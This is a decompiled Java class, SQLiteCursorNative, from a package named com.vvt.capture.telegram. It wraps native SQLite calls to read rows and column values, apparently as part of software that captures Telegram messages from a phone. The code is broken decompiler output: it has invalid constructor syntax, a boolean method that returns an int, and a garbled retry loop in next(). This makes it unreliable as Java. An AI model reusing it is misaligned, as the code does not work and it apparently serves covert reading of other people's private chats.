package com.vvt.capture.telegram.internal.SQLite;

import com.vvt.ak.a;
import java.nio.ByteBuffer;

public class SQLiteCursorNative
{
  private static final int FIELD_TYPE_BYTEARRAY = 4;
  private static final int FIELD_TYPE_FLOAT = 2;
  private static final int FIELD_TYPE_INT = 1;
  private static final int FIELD_TYPE_NULL = 5;
  private static final int FIELD_TYPE_STRING = 3;
  private static final boolean LOGE = a.e;
  private static final String TAG = SQLiteCursorNative.class.getSimpleName();
  boolean inRow = false;
  SQLitePreparedStatement preparedStatement;
  
  public SQLiteCursorNative(SQLitePreparedStatement paramSQLitePreparedStatement)
  {
    this.preparedStatement = paramSQLitePreparedStatement;
  }
  
  public int byteArrayLength(int paramInt)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnByteArrayLength(i, paramInt);
  }
  
  public byte[] byteArrayValue(int paramInt)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnByteArrayValue(i, paramInt);
  }
  
  public int byteBufferValue(int paramInt, ByteBuffer paramByteBuffer)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnByteBufferValue(i, paramInt, paramByteBuffer);
  }
  
  void checkRow()
  {
    boolean bool = this.inRow;
    if (!bool)
    {
      SQLiteException localSQLiteException = new com/vvt/capture/telegram/internal/SQLite/SQLiteException;
      localSQLiteException.<init>("You must call next before");
      throw localSQLiteException;
    }
  }
  
  native int columnByteArrayLength(int paramInt1, int paramInt2);
  
  native byte[] columnByteArrayValue(int paramInt1, int paramInt2);
  
  native int columnByteBufferValue(int paramInt1, int paramInt2, ByteBuffer paramByteBuffer);
  
  native double columnDoubleValue(int paramInt1, int paramInt2);
  
  native int columnIntValue(int paramInt1, int paramInt2);
  
  native int columnIsNull(int paramInt1, int paramInt2);
  
  native long columnLongValue(int paramInt1, int paramInt2);
  
  native String columnStringValue(int paramInt1, int paramInt2);
  
  native int columnType(int paramInt1, int paramInt2);
  
  public void dispose()
  {
    this.preparedStatement.dispose();
  }
  
  public double doubleValue(int paramInt)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnDoubleValue(i, paramInt);
  }
  
  public int getStatementHandle()
  {
    return this.preparedStatement.getStatementHandle();
  }
  
  public int getTypeOf(int paramInt)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnType(i, paramInt);
  }
  
  public int intValue(int paramInt)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnIntValue(i, paramInt);
  }
  
  public boolean isNull(int paramInt)
  {
    int i = 1;
    checkRow();
    SQLitePreparedStatement localSQLitePreparedStatement = this.preparedStatement;
    int j = localSQLitePreparedStatement.getStatementHandle();
    j = columnIsNull(j, paramInt);
    if (j == i) {}
    for (;;)
    {
      return i;
      i = 0;
    }
  }
  
  public long longValue(int paramInt)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnLongValue(i, paramInt);
  }
  
  public boolean next()
  {
    int i = -1;
    Object localObject = this.preparedStatement;
    SQLitePreparedStatement localSQLitePreparedStatement = this.preparedStatement;
    int j = localSQLitePreparedStatement.getStatementHandle();
    int k = ((SQLitePreparedStatement)localObject).step(j);
    if (k == i)
    {
      j = 6;
      for (;;)
      {
        int m = j + -1;
        if (j != 0) {}
        try
        {
          bool = LOGE;
          if (bool) {}
          long l = 500L;
          Thread.sleep(l);
          localSQLitePreparedStatement = this.preparedStatement;
          k = localSQLitePreparedStatement.step();
          if (k == 0)
          {
            if (k != i) {
              break;
            }
            localObject = new com/vvt/capture/telegram/internal/SQLite/SQLiteException;
            ((SQLiteException)localObject).<init>("sqlite busy");
            throw ((Throwable)localObject);
          }
          bool = m;
        }
        catch (Exception localException)
        {
          boolean bool = LOGE;
          if (bool) {}
          bool = m;
        }
      }
    }
    if (k == 0) {
      k = 1;
    }
    for (;;)
    {
      this.inRow = k;
      return this.inRow;
      k = 0;
      localObject = null;
    }
  }
  
  public String stringValue(int paramInt)
  {
    checkRow();
    int i = this.preparedStatement.getStatementHandle();
    return columnStringValue(i, paramInt);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/SQLite/SQLiteCursorNative.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */